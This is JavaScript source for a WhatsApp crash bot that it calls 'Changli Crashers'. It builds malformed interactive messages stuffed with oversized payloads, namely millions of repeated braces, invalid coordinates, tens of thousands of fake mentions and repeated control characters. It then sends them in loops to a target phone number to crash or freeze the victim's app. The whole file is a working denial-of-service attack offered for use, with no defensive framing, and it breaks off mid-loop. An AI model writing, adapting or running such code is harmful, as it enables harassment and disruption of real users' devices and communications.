// funct nya
async function ButtonCore(target) { 
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Changli Crashers"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ \"display_text\" : \"Changli Crashers\", \"url\" : \"\", \"merchant_url\" : \"\" }"
            }],
            'messageParamsJson': "{".repeat(10000000)
          }
        }
      }
    }
  }), {
    'userJid': target
  });
  await sock.relayMessage(target, messageContent.message, { 
    'participant': {
      'jid': target
    },
    'messageId': messageContent.key.id
  });
  console.log(chalk.blue("Succes send Button Ui New 🍷"));
}
async function LocationFlowX1(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ꉔꁝꋬꋊꍌ꒒꒐ ꁝꋬꋪꏂꂵ",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: " "
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    console.log(chalk.blue("Succes send Location Ui New 🍷"));
  } catch (err) {
    console.log(err);
  }
}
async function CrashInvis(target) {
  try {
    const coreMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "\u200E",
                address: "\u0007".repeat(20000),
              }
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000),
            }
          }
        }
      }
    };

    await sock.relayMessage(target, coreMsg, {
      participant: { jid: target },
      messageId: undefined
    });

    const followupMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "",
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, followupMsg, {
      participant: { jid: target }
    });

    await new Promise(resolve => setTimeout(resolve, 300));
  } catch (err) {}
}
async function LocaBetanew2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `‌𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟᪳ 𝐈‌𝐧‌𝐟𝐢𝐧‌𝐢‌𝐭𝐲${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(100000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}	      









// combonya
async function InvisibleFC(target) {
    for (let i = 0; i <= 10; i++){
          await ButtonCore(target);
          await LocationFlowX1(target);
          await CrashInvis(target);
          await LocaBetanew2(target);
    }
    
}
// cmbo di command
      for (let i = 0; i < 2; i++) {
           await InvisibleFC(formatedNumber);